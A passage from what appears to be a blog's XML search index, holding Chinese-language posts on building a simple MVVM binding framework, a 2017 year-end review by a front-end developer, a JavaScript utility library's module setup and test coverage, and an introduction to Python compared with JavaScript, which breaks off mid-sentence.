&#123; // 这里的 get 和 set 实现了 vm.data.title 和 vm.title 的值同步 return self.data[key] &#125;, set: function (newValue) &#123; self.data[key] = newValue &#125; &#125;) &#125;&#125; 实现了代理方法后，就步入主流程的实现 123456function Mvvm (options) &#123; this.data = options.data // ... observe(this.data) new Compile(options.el, this)&#125; observer(观察者) 的实现observer 的职责是监听 Model(JS 对象) 的变化，最核心的部分就是用到了 Object.defineProperty() 的 get 和 set 方法，当要获取 Model(JS 对象) 的值时，会自动调用 get 方法；当改动了 Model(JS 对象) 的值时，会自动调用 set 方法；从而实现了对数据的劫持，代码如下所示。 1234567891011121314151617181920212223242526272829303132let data = &#123; number: 0&#125;observe(data)data.number = 1 // 值发生变化function observe(data) &#123; if (!data || typeof(data) !== 'object') &#123; return &#125; const self = this Object.keys(data).forEach(key =&gt; self.defineReactive(data, key, data[key]) )&#125;function defineReactive(data, key, value) &#123; observe(value) // 遍历嵌套对象 Object.defineProperty(data, key, &#123; get: function() &#123; return value &#125;, set: function(newValue) &#123; if (value !== newValue) &#123; console.log('值发生变化', 'newValue:' + newValue + ' ' + 'oldValue:' + value) value = newValue &#125; &#125; &#125;)&#125; 运行代码，可以看到控制台输出 值发生变化 newValue:1 oldValue:0，至此就完成了 observer 的逻辑。 Dep(订阅者数组) 和 watcher(订阅者) 的关系观测到变化后，我们总要通知给特定的人群，让他们做出相应的处理吧。为了更方便地理解，我们可以把订阅当成是订阅了一个微信公众号，当微信公众号的内容有更新时，那么它会把内容推送(update) 到订阅了它的人。 那么订阅了同个微信公众号的人有成千上万个，那么首先想到的就是要 new Array() 去存放这些人(html 节点)吧。于是就有了如下代码： 12345678910111213141516171819202122232425262728293031323334353637// observer.jsfunction Dep() &#123; this.subs = [] // 存放订阅者&#125;Dep.prototype = &#123; addSub: function(sub) &#123; // 添加订阅者 this.subs.push(sub) &#125;, notify: function() &#123; // 通知订阅者更新 this.subs.forEach(function(sub) &#123; sub.update() &#125;) &#125;&#125;function observe(data) &#123;...&#125;function defineReactive(data, key, value) &#123; var dep = new Dep() observe(value) // 遍历嵌套对象 Object.defineProperty(data, key, &#123; get: function() &#123; if (Dep.target) &#123; // 往订阅器添加订阅者 dep.addSub(Dep.target) &#125; return value &#125;, set: function(newValue) &#123; if (value !== newValue) &#123; console.log('值发生变化', 'newValue:' + newValue + ' ' + 'oldValue:' + value) value = newValue dep.notify() &#125; &#125; &#125;)&#125; 初看代码也比较顺畅了，但可能会卡在 Dep.target 和 sub.update，由此自然而然地将目光移向 watcher， 123456789101112131415161718192021222324252627// watcher.jsfunction Watcher(vm, exp, cb) &#123; this.vm = vm this.exp = exp this.cb = cb this.value = this.get()&#125;Watcher.prototype = &#123; update: function() &#123; this.run() &#125;, run: function() &#123; // ... if (value !== oldVal) &#123; this.cb.call(this.vm, value) // 触发 compile 中的回调 &#125; &#125;, get: function() &#123; Dep.target = this // 缓存自己 const value = this.vm.data[this.exp] // 强制执行监听器里的 get 函数 Dep.target = null // 释放自己 return value &#125;&#125; 从代码中可以看到当构造 Watcher 实例时，会调用 get() 方法，接着重点关注 const value = this.vm.data[this.exp] 这句，前面说了当要获取 Model(JS 对象) 的值时，会自动调用 Object.defineProperty 的 get 方法，也就是当执行完这句的时候，Dep.target 的值传进了 observer.js 中的 Object.defineProperty 的 get 方法中。同时也一目了然地在 Watcher.prototype 中发现了 update 方法，其作用即触发 compile 中绑定的回调来更新界面。至此解释了 Observer 中 Dep.target 和 sub.update 的由来。 来归纳下 Watcher 的作用，其充当了 observer 和 compile 的桥梁。 1 在自身实例化的过程中，往订阅器(dep) 中添加自己 2 当 model 发生变动，dep.notify() 通知时，其能调用自身的 update 函数，并触发 compile 绑定的回调函数实现视图更新 最后再来看下生成 Watcher 实例的 compile.js 文件。 compile(编译) 的实现首先遍历解析的过程有多次操作 dom 节点，为提高性能和效率，会先将跟节点 el 转换成 fragment(文档碎片) 进行解析编译，解析完成，再将 fragment 添加回原来的真实 dom 节点中。代码如下： 1234567891011121314151617181920212223242526function Compile(el, vm) &#123; this.vm = vm this.el = document.querySelector(el) this.fragment = null this.init()&#125;Compile.prototype = &#123; init: function() &#123; if (this.el) &#123; this.fragment = this.nodeToFragment(this.el) // 将节点转为 fragment 文档碎片 this.compileElement(this.fragment) // 对 fragment 进行编译解析 this.el.appendChild(this.fragment) &#125; &#125;, nodeToFragment: function(el) &#123; const fragment = document.createDocumentFragment() let child = el.firstChild // △ 第一个 firstChild 是 text while(child) &#123; fragment.appendChild(child) child = el.firstChild &#125; return fragment &#125;, compileElement: function(el) &#123;...&#125;,&#125; 这个简单的 mvvm 框架在对 fragment 编译解析的过程中对 {{}} 文本元素、v-on:click 事件指令、v-model 指令三种类型进行了相应的处理。 1234567891011121314151617181920212223242526272829303132333435363738Compile.prototype = &#123; init: function() &#123; if (this.el) &#123; this.fragment = this.nodeToFragment(this.el) // 将节点转为 fragment 文档碎片 this.compileElement(this.fragment) // 对 fragment 进行编译解析 this.el.appendChild(this.fragment) &#125; &#125;, nodeToFragment: function(el) &#123;...&#125;, compileElement: function(el) &#123;...&#125;, compileText: function (node, exp) &#123; // 对文本类型进行处理替换 const self = this const initText = this.vm[exp] this.updateText(node, initText) // 初始化 new Watcher(this.vm, exp, function(value) &#123; // 实例化订阅者 self.updateText(node, value) &#125;) &#125;, compileEvent: function (node, vm, exp, dir) &#123; // 对事件指令进行处理 const eventType = dir.split(':')[1] const cb = vm.methods &amp;&amp; vm.methods[exp] if (eventType &amp;&amp; cb) &#123; node.addEventListener(eventType, cb.bind(vm), false) &#125; &#125;, compileModel: function (node, vm, exp) &#123; // 对 v-model 进行处理 let val = vm[exp] const self = this this.modelUpdater(node, val) node.addEventListener('input', function (e) &#123; const newValue = e.target.value self.vm[exp] = newValue // 实现 view 到 model 的绑定 &#125;) &#125;,&#125; 在上述代码的 compileTest 函数中看到了期盼已久的 Watcher 实例化，对 Watcher 作用模糊的朋友可以往上回顾下 Watcher 的作用。另外在 compileModel 函数中看到了本文最开始提到的双向绑定流中的 View 到 Model 是借助 input 监听事件变化实现的。 项目地址本文记录了些阅读 mvvm 框架源码关于双向绑定的心得，并动手实践了一个简版的 mvvm 框架，不足之处在所难免，欢迎指正。 项目演示 项目地址]]></content>
      <categories>
        <category>Mvvm</category>
      </categories>
      <tags>
        <tag>Mvvm</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2017 年终总结 —— 在路上]]></title>
    <url>%2Fblog%2F2017%2F12%2F27%2F2017-%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[不久前年会主题征集活动中，我提交的主题是《在路上》，和骑手们一样，我们亦不是在路上呢？ 恰逢踏入社会一年之际写下第一篇年终总结，百感交集，有初融入团队的喜悦、有独自完成需求的兴奋、有一次次团建的畅饮也有过为自己能力不足的懊恼以及与好友离别的感伤。 通过这篇总结，希望能记录些琐事，并给 2018 年的自己定下 promise。 启程按捺不住走出校园的兴奋，走入我达新世界的大门。当时未进公司的时候，在朋友圈中看到的小伙伴们的照片，当时心中一阵惊叹，”这么帅！！要拖后腿了”，不曾想到后来几个月和每个人发生的故事，已然成为生命中不可或缺的色彩了。时隔一年当再次回味这张照片时，似乎里面藏着初心。 春节结束后公司如期举行了年会，我在倒数第二个节目中独奏了二胡~，前端部门的年会中奖率也是全公司最高的，一度让其他部门的人说是改了脚本o(╯□╰)o。运气也是实力的一部分吧，不过我没有中奖。再接着是为期 15 天的小黑屋封闭式开发快递模块，这也是我第一次感觉到了挫败感，让林师傅帮填了好多坑。期间李开复老师来参观我们公司，我也跑去趁了张合照。同时迎来了陪我渡过短暂岁月的小伙伴虾球。一只可爱的猫咪。现在在新主人家过得很好。 batman &amp;&amp; hawkeye在往后的一段时间，前端部门内部进行了更细致的分工划分，我被划分到了直营业务组，主要负责 batman(客服关系系统) 以及 hawkeye(运维系统)的开发与维护，期间经历了并参与了 batman、hawkeye 的技术栈迭代，从老鹰眼的 reflux 到 redux，以及 batman 网关独立抽离成一个 ts 项目。为了更好的熟悉 react 全家桶的工作流程，五月份的时候在仿照 batman 和 hawkeye 写了个 demo，现在收获了几百的 Star，也算今年的一大收获吧。o(╯□╰)o 下面谈谈今年在做项目的收获和成长： 首先是带我进入了奇妙的 React 技术栈 和 ES6 世界，对相关的知识点进行了实践； 能合理对组件进行拆分； 对 JS 异步流程有了一定认知； 对底层组件的设计有了一定的认知； 对 git 多人合作的流程有了一定的实践； 在遇到不懂的知识时学会进行翻相关文档以及阅读源码； 最后在 npm 上尝试发布了第一个包，并用到了 batman 中; 谈完收获再来谈谈不足： 知识点体系没有梳理成网，比较零散； 知识面广度和深度都还欠缺; 在项目优化的层面没有特别上心; 在和别人交谈时，抓重点能力以及逻辑整合能力有待加强； 效率不足，容易被琐事影响； 高山仰止分享一位同行的博客中让我感慨良多的话：行远自迩，登高自卑。在写这篇总结前我曾以为这句话是说当你登高的途中看到比你站在更高更远处的人的时候会产生自卑感，现在不经莞尔一笑，风起于青萍之末，浪成于微澜之间，那些让我高高仰望的人不正是有着一颗常人难能企及的大毅力和大心脏吗？而我呢，希望能离那群人能近一点是一点吧。想到现在负责的项目名为 batman，突然谐音想到了 better-man。新年计划做一个让别人靠得住的 better-man。 番外随笔今年刷了好多动漫，整体偏热血、玄幻类型，也入了 B 站刷了几部小清新动漫，如四月是你的谎言、宝石之国~，和朋友一起刷了几部有意义的电影，比如爱乐之城、寻梦环游记~；另外从 4 月份开始使用网易云音乐来，累计听了七八千首歌吧，基本码代码的时候都会带着耳机~，以英文歌、民谣为主，我的歌单如下； 在游戏方面发挥稳定，王者荣耀上了最强王者以及为团队拿下个冠军，不过感觉花了太多时间在上面，浪费了不少原定的计划~，不过也算是青春的成长吧。公司年假即将会去曼巴玩上一段时间，也将算是我第一次出国。 看书方面主要是技术类的，大概阅读了 6、7 本，这个比较尴尬了，看书看得慢而且看过的知识点也不是完全吃透了，新年期待改善。个人产出方面也比较低产，翻译文章和原创文章加起来十几篇~，我把它们集合在了 blog这个项目里。不过也有值得高兴的事，搭建了自己的博客，并且写文章的深度自己感觉有所提高(虽然依然菜)。然后很遗憾的是今年的技术交流会一场也没参加成，怪自己的消息不灵通加上水平的不足。 总结展望篇这部分是对自己打算要成为一个 better-man 的一个 promise 吧。就结合文章中提到的不足点进行相应的改善(自己想到解决方案的先记下来了)，也就是新年的计划。望监督。 problen flag 知识点碎片化 对已有的知识点进行思维脑图的整理，对将来的知识点也采取思维脑图的方式进行学习 知识面广度和深度欠缺 参与到一个千星 Star 的开源项目的改善，提高阅读源码的能力，阅读 6 本技术书籍，阅读 1 本非技术书籍 项目优化方面没有用心 课外学习积累相关方面知识并尝试用到公司项目中 没去成技术交流会 带有目的性地参加 1 到 2 场前端技术交流会 沟通能力不足 避免讲话结巴，加强语言组织能力和逻辑能力，没想清楚问题之前不要轻易回答 效率不足 加强自己的自控能力，规定的时间做规定的事情，做到按时起睡，不晚于 8 点半起床]]></content>
      <categories>
        <category>年度总结</category>
      </categories>
      <tags>
        <tag>年度总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[尝试造了个工具类库，名为 Diana]]></title>
    <url>%2Fblog%2F2017%2F12%2F07%2F%E9%80%A0%E8%BD%AE%E5%AD%90%E7%83%AD%E8%BA%AB%2F</url>
    <content type="text"><![CDATA[项目地址: diana 文档地址: http://muyunyun.cn/diana/ 造轮子的意义为啥已经有如此多的前端工具类库还要自己造轮子呢？个人认为有以下几个观点吧： 定制性强，能根据自己的需求为主导延伸开发。万一一不小心还能帮到别人（比如 React 库）； 纸上得来终觉浅，很多流行的库，只是照着它们的 API 进行使用，其实这些库里蕴含着大量的知识、技巧，最好的办法就是仿照它们来写些小 demo，从而体会这些库的精髓； 造轮子的过程中能让自己体会到与平常业务开发不一样的乐趣；比如和日常业务开发中很大的一个区别是会对测试用例具有比较严格的要求；而且写文档能力提升了。 就先瞎编到这里了。。。 抛开内部方法(写相应的专题效果可能会更好，所以这里先略过)，下面分享一些开发 diana 库 时的一些心得： 项目目录结构1234567891011121314151617181920212223242526272829303132├── LICENSE 开源协议├── README-zh_en.md 英文说明文档├── README.md 中文说明文档├── coverage 代码覆盖率文件├── docs 文档目录│ └── static-parts│ ├── index-end.html 静态文档目录结尾文件│ └── index-start.html 静态文档目录开头文件├── karma.conf.js karma 配置文件├── lib│ ├── diana.back.js 服务端引用入口│ └── diana.js 浏览器引用入口├── package.json├── script│ ├── build.js 构建文件│ ├── check.js 结合 pre-commit 进行 eslint 校验│ ├── tag-script.js 自动生成文档的标签│ ├── web-script.js 自动生成文档│ ├── webpack.browser.js 浏览器端 webpack 配置文件│ └── webpack.node.js 服务器端 webpack 配置文件├── snippets├── src│ ├── browser 浏览器端方法│ ├── common 共用方法│ ├── node node 端方法│ └── util.js 库内通用方法├── tag_database 文档标签└── test 测试文件 ├── browserTest ├── commonTest ├── index.js └── nodeTest 目录结构也随着方法的增多在不停迭代当中，建议直接到库中查看最新的目录结构。 相应地，具体的方法会随着时间迭代，所以首先推荐查看文档，点击如下图的 Ⓢ 就能查看源码。 让模块同时在 Node.js 与浏览器中运行我们可以通过如下方法来判断模块当前是运行在 Node.js 还是浏览器中，然后使用不同的方式实现我们的功能。 12// Only Node.JS has a process variable that is of [[Class]] processconst isNode = Object.prototype.toString.call(typeof process !== 'undefined' ? process : 0) === '[object process]' 但如果用户使用了模块打包工具，这样做会导致 Node.js 与浏览器的实现方式都会被包含在最终的输出文件中。针对这个问题，开源社区提出了在 package.json 中添加 browser 字段的提议，目前 webpack 和 rollup 都已经支持这个字段了。 给 browser 字段提供一个文件路径作为在浏览器端使用时的模块入口，但需要注意的是，打包工具会优先使用 browser 字段指定的文件路径作为模块入口，所以你的 main 字段 和 module 字段会被忽略，但是这会导致打包工具不会优化你的代码。详细信息请参考这个问题。 在 diana 库 为了在不同环境中使用适当的文件，在 package.json 中进行了如下声明： 12"browser": "lib/diana.js","main": "lib/diana.back.js", // 或者 "module": "lib/diana.back.js", 这样一来，在 node 环境中，引用的是 lib/diana.back.js 文件，在浏览器环境中，引用的是 lib/diana.js 文件。然后就能愉快地在浏览器端和 node 端愉快地使用自己特有的 api 了。 常见模块规范比较另外为了使 diana 库 的打包文件兼容 node 端、以及浏览器端的引用，选择了 UMD 规范进行打包，那么为什么要选择 UMD 规范呢？让我们看下以下几种规范之间的异同： CommonJS CommonJs 是服务器端模块的规范，Node.js 采用了这个规范。这些规范涵盖了模块、二进制、Buffer、字符集编码、I/O流、进程环境、文件系统、套接字、单元测试、服务器网关接口、包管理等。 根据 CommonJS 规范，一个单独的文件就是一个模块。加载模块使用 require 方法，该方法读取一个文件并执行，最后返回文件内部的 exports 对象。 CommonJS 加载模块是同步的。像 Node.js 主要用于服务器的编程，加载的模块文件一般都已经存在本地硬盘，所以加载起来比较快，不用考虑异步加载的方式，所以 CommonJS 规范比较适用。但如果是浏览器环境，要从服务器加载模块，这是就必须采用异步模式。所以就有了 AMD、CMD 解决方案。 AMD、CMD AMD 是 RequireJS 在推广过程中对模块定义的规范化产物。AMD 推崇提前执行。 123456 // AMD 默认推荐的是define(['./a', './b'], function(a, b) &#123; a.doSomething() b.doSomething() ...&#125;) CMD 是 SeaJS 在推广过程中对模块定义的规范化产物。CMD 推崇依赖就近。 12345678// CMDdefine(function(require, exports, module) &#123; var a = require('./a') a.doSomething() var b = require('./b') b.doSomething() ...&#125;) UMDUMD 是 AMD 和 CommonJS 的结合。因为 AMD 是以浏览器为出发点的异步加载模块，CommonJS 是以服务器为出发点的同步加载模块，所以人们想出了另一个更通用的模式 UMD，来解决跨平台的问题。 diana 库 选择了以 umd 方式进行输出，来看下 UMD 做了啥：123456789101112(function (root, factory) &#123; if (typeof exports === 'object' &amp;&amp; typeof module === 'object') &#123; // UMD 先判断是否支持 Node.js 的模块（exports）是否存在，存在则使用 CommonJS 模式 module.exports = factory() &#125; else if (typeof define === 'function' &amp;&amp; define.amd) &#123; // 接着判断是否支持 AMD（define是否存在），存在则使用 AMD 方式加载模块。 define([], factory) &#125; else if (typeof exports === 'object') &#123; // CommonJS 的另一种形式 exports['diana'] = factory() &#125; else root['diana'] = factory() // Window&#125;)(this, function() &#123; return module&#125;) 测试踩坑之路代码覆盖率单元测试的代码覆盖率统计，是衡量测试用例好坏的一个的方法。但凡是线上用的库，基本上都少不了高质量的代码覆盖率的检测。如下图为 diana 库的测试覆盖率展示。 可以看到覆盖率分为以下 4 种类型， 行覆盖率（line coverage）：是否每一行都执行了？ 函数覆盖率（function coverage）：是否每个函数都调用了？ 分支覆盖率（branch coverage）：是否每个if代码块都执行了？ 语句覆盖率（statement coverage）：是否每个语句都执行了？ 番外：github 上显示的覆盖率是根据行覆盖率来展示的。 mocha + istanbul最初的版本, 仅仅用到 mocha 进行测试 *.test.js 文件，然后在 codecov 得到测试覆盖率。 引人 karma如果仅仅测试 es5、es6 的语法，其实用 mocha 就已经够用了，但是涉及到测试 Dom 操作的语法等就必须建立一个浏览器，在上面进行测试。karma 的作用其实就是自动帮我们建立一个测试用的浏览器环境。 为了让浏览器支持 Common.js 规范，中间用了 karma + browserify，尽管测试用例都跑通了，但是最后的代码覆盖率的文件里只有各个方法的引用路径。最后只能又回到 karma + webpack 来，这里又踩到一个坑，打包编译JS代码覆盖率问题，踩了一些坑后，终于实现了可以查看编译前代码的覆盖率。图如下： 通过这幅图我们能清晰地看到源代码中测试用例跑过各行代码的次数(左侧的数字)，以及测试用例没有覆盖到的代码(图中红色所示)。然后我们就能改善相应的测试用例从而提高测试覆盖率。 配置文件，核心部分如下:12345678910111213141516171819202122232425262728293031module.exports = function(config) &#123; config.set(&#123; files: ['test/index.js'], // 需载入浏览器的文件 preprocessors: &#123; // 预处理 'test/index.js': ['webpack', 'coverage'] &#125;, webpack: &#123; module: &#123; rules: [&#123; test: /\.js$/, use: &#123; loader: 'sourcemap-istanbul-instrumenter-loader' &#125;, // 这里用 istanbul-instrumenter-loader 插件的 0.0.2 版本，其它版本有坑~ exclude: [/node_modules/, /\.spec.js$/], &#125;], &#125; &#125;, coverageReporter: &#123; type: 'lcov', // 貌似只能支持这种类型的读取 dir: 'coverage/' &#125;, remapIstanbulReporter: &#123; // 生成 coverage 文件 reports: &#123; 'text-summary': null, json: 'coverage/coverage.json', lcovonly: 'coverage/lcov.info', html: 'coverage/html/', &#125; &#125;, reporters: ['progress', 'karma-remap-istanbul'], // remap-isbanbul 也报了一个未找到 sourcemap 的 error，直接注释了 remap-istanbul 包的 CoverageTransformer.js 文件的 169 行，以后有机会再捣鼓吧。（心累） ... &#125;)&#125; 总结本文围绕 diana 库 对造轮子的意义，模块兼容性，测试用例进行了思考总结。后续会对该库流程自动化以及性能上做些分享。该库参考学习了很多优秀的库，感谢 underscore、outils、ec-do、30-seconds-of-code 等库对我的帮助。 最后欢迎各位大佬在 issues 尽情吐槽。]]></content>
      <categories>
        <category>轮子</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>轮子</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[走近 Python (类比 JS)]]></title>
    <url>%2Fblog%2F2017%2F10%2F31%2F%E8%B5%B0%E8%BF%91-Python%2F</url>
    <content type="text"><![CDATA[本文首发在 个人博客 Python 是一门运用很广泛的语言，自动化脚本、爬虫，甚至在深度学习领域也都有 Python 的身影。作为一名前端开发者，也了解 ES6 中的很多特性借鉴自 Python (比如默认参数、解构赋值、Decorator等)，同时本文会对 Python 的一些用法与 JS 进行类比。不管是提升自己的知识广度，还是更好地迎接 AI 时代，Python 都是一门值得学习的语言。 数据类型在 Python 中，最常用的能够直接处理的数据类型有以下几种： 数字[整数(int)、浮点型(float)、长整型(long)、复数(complex)] 字符串(str) 布尔值(bool) 空值(None) 除此之外，Python 还提供了列表[list]、字典[dict] 等多种数据类型，这在下文中会介绍。 类型转换与类型判断与 JS 十分类似，python 也能实现不同数据类型间的强制与隐式转换，例子如下： 强制类型转换:1234567int('3') # 3str(3.14) # '3.14'float('3.14') # 3.14# 区别于 JS 只有 Number 一种类型，Python 中数字中的不同类型也能相互强制转换float(3) # 3.0bool(3) # Truebool(0) # False 隐式类型转换:123451 + 1.0 # 2.01 + False # 11.0 + True # 2.0# 区别于 JS 的 String + Number = String, py 中 str + int 会报错1 + '1' # TypeError: cannot concatenate 'str' and 'int' objects 此外写代码的时候经常会需要判断值的类型，可以 使用 python 提供的 type() 函数获取变量的类型，或者使用 isinstance(x, type) 来判断 x 是否属于相应的 type 类型。123456type(1.3) == float # Trueisinstance('a', str) # Trueisinstance(1.3, int) # Falseisinstance(True, bool) # Trueisinstance([], list) # Trueisinstance(&#123;&#125;, dict) # True 有序集合类型集合是指包含一组元素的数据结构，有序集合即集合里面的元素是是按照顺序排列的，Python 中的有序集合大概有以下几类：list, tuple, str, unicode。 list 类型Python 中 List 类型类似于 JS 中的 Array, 1234567891011L = [1, 2, 3]print L[-1] # '3'L.append(4) # 末尾添加元素print L # [1, 2, 3, 4]L.insert(0, 'hi') # 指定索引位置添加元素print L # ['hi', 1, 2, 3, 4]L.pop() # 末尾移除元素 L.pop(2) ?????? 2 ???print L # ['hi', 1, 2, 3] tuple 类型tuple 类型是另一种有序的列表，中文翻译为“ 元组 ”。tuple 和 list 非常类似，但是，tuple 一旦创建完毕，就不能修改了。 123456789t = (1, 2, 3)print t[0] # 1t[0] = 11 # TypeError: 'tuple' object does not support item assignmentt = (1)print t # 1 t 的结果是整数 1t = (1,) # 为了避免出现如上有歧义的单元素 tuple，所以 Python 规定，单元素 tuple 要多加一个逗号“,”print t # (1,) 无序集合类型dict 类型Python 中的 dict 类型类似于 JS 中的 {} (最大的不同是它是没有顺序的), 它有如下特点: 查找速度快 (无论 dict 有 10 个元素还是 10 万个元素，查找速度都一样) 占用内存大 (与 list 类型相反) dict 中的 key 不能重复 dict 中存储的 key-value 序对是没有顺序的 1234567891011121314d = &#123; 'a': 1, 'b': 2, 'c': 3&#125;print d # &#123;'a': 1, 'c': 3, 'b': 2&#125; 可以看出打印出的序对没有按正常的顺序打出# 遍历 dictfor key,value in d.items(): print('%s: %s' % (key,value))# a: 1# c: 3# b: 2 set 类型有的时候，我们只想要 dict 的 key，不关心 key 对应的 value，而且要保证这个集合的元素不会重复，这时，set 类型就派上用场了。set 类型有如下特点： set 存储的元素和 dict 的 key 类似，必须是不变对象 set 存储的元素也是没有顺序的 12345678s = set(['A', 'B', 'C', 'C'])print s # set(['A', 'C', 'B'])s.add('D')print s # set(['A', 'C', 'B', 'D'])s.remove('D')print s # set(['A', 'C', 'B']) Python 中的迭代在介绍完 Python 中的有序集合和无序集合类型后，必然存在遍历集合的 for 循环。但是和其它语言的标准 for 循环不同，Python 中的所有迭代是通过 for … in 来完成的。以下给出一些常用的迭代 demos: 索引迭代： 1234567L = ['apple', 'banana', 'orange']for index, name in enumerate(L): # enumerate() 函数把 ['apple', 'banana', 'orange'] 变成了类似 [(0, 'apple), (1, 'banana'), (2, 'orange')] 的形式 print index, '-', name# 0 - apple# 1 - banana# 2 - orange 迭代 dict 的 value: 1234567d = &#123; 'apple': 6, 'banana': 8, 'orange': 5 &#125;print d.values() # [6, 8, 5]for v in d.values() print v# 6# 8# 5 迭代 dict 的 key 和 value: 123456d = &#123; 'apple': 6, 'banana': 8, 'orange': 5 &#125;for key, value in d.items() print key, ':', value# apple : 6# banana: 8# orange: 5 切片操作符Python 提供的切片操作符类似于 JS 提供的原生函数 slice()。有了切片操作符，大大简化了一些原来得用循环的操作。 12345L = ['apple', 'banana', 'orange', 'pear']L[0:2] # ['apple', 'banana'] 取前 2 个元素L[:2] # ['apple', 'banana'] 如果第一个索引是 0，可以省略L[:] # ['apple', 'banana', 'orange', 'pear'] 只用一个 : ，表示从头到尾L[::2] # ['apple', 'orange'] 第三个参数表示每 N 个取一个，这里表示从头开始，每 2 个元素取出一个来 列表生成器如果要生成 [1x1, 2x2, 3x3, …, 10x10] 怎么做？方法一是循环： 123L = []for x in range(1, 11): L.append(x * x) 但是循环太繁琐，而列表生成式则可以用一行语句代替循环生成上面的 list： 123# 把要生成的元素 x * x 放到前面，后面跟 for 循环，就可以把 list 创建出来[x * x for x in range(1, 11)]# [1, 4, 9, 16, 25, 36, 49, 64, 81, 100] 列表生成式的 for 循环后面还可以加上 if 判断(类似于 JS 中的 filter() 函数)，示例如下： 12[x * x for x in range(1, 11) if x % 2 == 0]# [4, 16, 36, 64, 100] for 循环可以嵌套，因此，在列表生成式中，也可以用多层 for 循环来生成列表。 12[m + n for m in 'ABC' for n in '123']# ['A1', 'A2', 'A3', 'B1', 'B2', 'B3', 'C1', 'C2', 'C3'] Python 函数默认参数JS 中 ES6 的 默认参数正是借鉴于 Python，用法如下： 12345def greet(name='World'): print 'Hello, ' + name + '.'greet() # Hello, World.greet('Python') # Hello, Python. 可变参数类似于 JS 函数中自动识别传入参数的个数，Python 也提供了定义可变参数，即在可变参数的名字前面带上个 * 号。 123456def fn(*args): print argsfn() # ()fn('a') # ('a',)fn('a', 'b') # ('a', 'b') Python 解释器会把传入的一组参数组装成一个 tuple 传递给可变参数，因此，在函数内部，直接把变量 args 看成一个 tuple 就好了。 常用高阶函数Python 中常用的函数 (map、reduce、filter) 的作用和 JS 中一致，只是用法稍微不同。 map 函数: 接收一个函数 f 和一个 list，并通过把函数 f 依次作用在 list 的每个元素上，得到一个新的 list 并返回。 123def f(x): return x * xprint map(f, [1, 2, 3, 4, 5, 6, 7, 8, 9]) # [1, 4, 9, 16, 25, 36, 49, 64, 81] reduce 函数: 接收一个函数 f 和一个 list(可以接受第三个值作为初始值)，reduce() 对 list 的每个元素反复调用函数 f，并返回最终结果值。 1234def f(x, y): return x * yreduce(f, [1, 3, 5]) # 15 filter 函数: 接收一个函数 f 和一个list，这个函数 f 的作用是对每个元素进行判断，返回 True或 False，filter() 根据判断结果自动过滤掉不符合条件的元素，返回由符合条件元素组成的新 list。 1234def is_odd(x): return x % 2 == 1filter(is_odd, [1, 4, 6, 7, 9, 12, 17]) # [1, 7, 9, 17] 匿名函数和 JS 的匿名函数不同的地方是，Python 的匿名函数中只能有一个表达式，且不能写 return。拿 map() 函数为例： 1map(lambda x: x * x, [1, 2, 3, 4, 5, 6, 7, 8, 9]) # [1, 4, 9, 16, 25, 36, 49, 64, 81] 关键词 lambda 表示匿名函数，冒号前面的 x 表示函数参数，可以看出匿名函数 lambda x: x* x 实际上就是: 12def f(x): return x * x 闭包之前写过一些关于 JS 闭包的文章，比如 深入浅出JavaScript之闭包（Closure）、以及 读书笔记-你不知道的 JavaScript (上)，Python 中闭包的定义和 JS 中的是一致的即：内层函数引用了外层函数的变量，然后返回内层函数。下面来看下 Py 中闭包之 for 循环经典问题： 1234567891011# 希望一次返回3个函数，分别计算1x1,2x2,3x3:def count(): fs = [] for i in range(1, 4): def f(): return i * i fs.append(f) return fsf1, f2, f3 = count() # 这种写法相当于 ES6 中的解构赋值print f1(), f2(), f3() # 9 9 9 老问题了，f1(), f2(), f3() 结果不应该是 1, 4, 9 吗，实际结果为什么都是 9 呢？ 原因就是当 count() 函数返回了 3 个函数时，这 3 个函数所引用的变量 i 的值已经变成了 3。由于 f1、f2、f3 并没有被调用，所以，此时他们并未计算 i*i，当 f1 被调用时，i 已经变为 3 了。 要正确使用闭包，就要确保引用的局部变量在函数返回后不能变。代码修改如下: 方法一: 可以理解为创建了一个封闭的作用域，i 的 值传给 j 之后，就和 i 没任何关系了。每次循环形成的闭包都存进了内存中。12345678910111213def count(): fs = [] for i in range(1, 4): def f(j): def g(): # 方法一 return j * j return g r = f(i) fs.append(r) return fsf1, f2, f3 = count()print f1(), f2(), f3() # 1 4 9 方法二：思路比较巧妙，用到了默认参数 j 在函数定义时可以获取到 i 的值，虽然没有用到闭包，但是和方法一有异曲同工之处。12345678910def count(): fs = [] for i in range(1, 4): def f(j = i): # 方法二 return j * j fs.append(f) return fsf1, f2, f3 = count()print f1(), f2(), f3() # 1 4 9 decorator 装饰器ES6 的语法中的 decorator 正是借鉴了 Python 的 decorator。decorator 本质上就是一个高阶函数，它接收一个函数作为参数，然后返回一个新函数。 那装饰器的作用在哪呢？先上一段日常项目中用 ts 写的网关代码： 12345678910@Post('/rider/detail') // URL 路由@log() // 打印日志 @ResponseBody public async getRiderBasicInfo( @RequestBody('riderId') riderId: number, @RequestBody('cityId') cityId: number, ) &#123; const result = await this.riderManager.findDetail(cityId, riderId) return result &#125; 可以看出使用装饰器可以极大地简化代码，避免每个函数(比如日志、路由、性能检测)编写重复性代码。 回到 Python 上，Python 提供的 @ 语法来使用 decorator，@ 等价于 f = decorate(f)。下面来看看 @log() 在 Python 中的实现: 123456789101112131415161718# 我们想把调用的函数名字给打印出来@log()def factorial(n): return reduce(lambda x,y: x*y, range(1, n+1))print factorial(10)# 来看看 @log() 的定义def log(): def log_decorator(f): def fn(x): print '调用了函数' + f.__name__ + '()' return f(x) return fn return log_decorator# 结果# 调用了函数 factorial()# 3628800 class面向对象编程面向对象编程是一种程序设计范式，基本思想是：用类定义抽象类型，然后根据类的定义创建出实例。在掌握其它语言的基础上，还是比较容易理解这块知识点的，比如从下面两种写法可以看出不同语言的语言特性间竟然有如此多的共性。 es6: (附：本文的主题是 python，所以只是初略展示下 js 中类的定义以及实例的创建，为了说明写法的相似性)12345678class Person &#123; constructor(name, age) &#123; this.name = name this.age = age &#125;&#125;const child1 = new Person('Xiao Ming', 10) Python: (核心要点写在注释中)12345678910111213141516# 定义一个 Person 类：根据 Person 类就可以造成很多 child 实例class Person(object): address = 'Earth' # 类属性 (实例公有) def __init__(self, name, age): # 创建实例时，__init__()方法被自动调用 self.name = name self.age = age def get_age(self): # 定义实例方法，它的第一个参数永远是 